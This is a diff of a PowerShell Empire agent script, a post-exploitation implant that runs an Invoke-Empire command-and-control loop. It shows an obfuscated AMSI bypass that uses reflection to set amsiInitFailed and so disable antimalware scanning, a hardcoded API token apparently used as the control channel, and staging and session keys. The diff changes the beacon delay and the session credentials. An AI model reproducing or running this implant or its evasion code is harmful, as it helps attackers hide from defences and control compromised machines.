@@ -3,6 +3,7 @@ ${A`S`SeMBly} = [Ref]."aSS`EMbLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W}
 ${fI`eld} = ${a`ssE`M`BlY}.('GetFiel'+'d').Invoke(('am{0}InitFailed' -f ${C}),('N'+'o'+'nPubli'+'c,Stat'+'i'+'c'))
 ${f`i`ELd}.('Se'+'tV'+'alue').Invoke(${nU`Ll},${tr`Ue})
 
+
 $Script:APIToken = "sl.B6Sjq3a2oMRT4YkFdIfMumRrfcASJBjPBH3KsiUxZCHS-Csw8RdZGcYGyTtPbCRJtYPzuEs2q5JXBqtpmwzoT_Pgi6CE9FhxGRdWqc3QpSbtKlfH_eQWmm55EyPHZFS4ofwiY7lG6IsB";
 
 $Script:GetTask = {
@@ -123,7 +124,7 @@ function Invoke-Empire {
         [String]
         $SessionID,
         [Int32]
-        $AgentDelay = 52,
+        $AgentDelay = 13,
         [Double]
         $AgentJitter = 0.0,
         [String[]]
@@ -1017,4 +1018,4 @@ function Invoke-Empire {
     }
 }
 
-Invoke-Empire -Servers @('') -StagingKey 'ddd55e431c266fe6cc8ee989a84dfe1c' -SessionKey 'mU4[?zb2!c%Cf~uyn3hM01TFX#DBsw9o' -SessionID 'Y7K1L1ZX' -WorkingHours '' -KillDate '';
+Invoke-Empire -Servers @('') -StagingKey 'ddd55e431c266fe6cc8ee989a84dfe1c' -SessionKey 'a#OWtHkzei&4-u.D(;nmF:8hN!3U]`J2' -SessionID 'P5MVOWBV' -WorkingHours '' -KillDate '';
